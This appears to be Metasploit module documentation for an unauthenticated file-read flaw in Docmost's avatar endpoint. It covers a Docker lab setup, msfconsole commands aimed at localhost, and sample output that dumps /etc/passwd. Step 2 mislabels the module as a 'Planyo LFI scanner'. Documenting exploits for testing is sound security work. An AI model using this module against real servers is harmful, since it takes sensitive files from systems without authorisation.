## Vulnerable Application

Docmost from versions 0.2.1 until 0.21.0, fails to validate file paths sent to the publicly accessible /api/attachments/img/avatar endpoint.
This leads to an arbitrary file read vulnerability allowing unauthenticated attackers to retrieve local sensitive files.

This module uses this vulnerability to retrieve the contents of arbitrary local files by performing directory traversal via avatar endpoint.

### Pre-requisites
- **Docker** and **Docker compose** installed.

## Setup

1. **Create a home directory and download docker-compose file**
```
mkdir docmost
cd docmost
curl -O https://raw.githubusercontent.com/docmost/docmost/main/docker-compose.yml
```
2. **Edit the docker-compose.yml file**
```
# Generate a long random secret key
openssl rand -hex 32

# Open the docker-compose.yml file and make the following changes:
# 1. Replace `image: docmost/docmost:latest` with `image: docmost/docmost:0.21.0`
# 2. Replace `APP_SECRET` with the random secret key generated above 
```
3. **Start the container**
```
sudo docker-compose up -d
```
4. **Enter Workspace details**

Navigate to http://localhost:3000/ and enter dummy details for workspace name, name, email and password

## Verification Steps
1. **Launch Metasploit**
```
msfconsole
```
2. **Load the Planyo LFI scanner**
```
use auxiliary/gather/docmost_fileread_cve_2025_57231
set RHOSTS 127.0.0.1
set RPORT 3000
set TARGETURI /
```
3. **Run the module**
```
run
```
4. **Observe output**

The module should:
- Check if the target is alive
- Retrieve the file and save it locally

## Options

- **TARGETURI**(`/`): Base path to Docmost installation
- **FILEPATH**(`/etc/passwd`): Path of local file to download

## Scenarios
```
msf auxiliary(gather/docmost_fileread_cve_2025_57231) > run
[*] Running module against 127.0.0.1
[*] File saved to: /home/kali/.msf4/loot/20260913065411_default_127.0.0.1_docmost.http_208561.bin
[*] Auxiliary module execution completed
msf auxiliary(gather/docmost_fileread_cve_2025_57231) > cat /home/kali/.msf4/loot/20260913065411_default_127.0.0.1_docmost.http_208561.bin
[*] exec: cat /home/kali/.msf4/loot/20260913065411_default_127.0.0.1_docmost.http_208561.bin

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
```
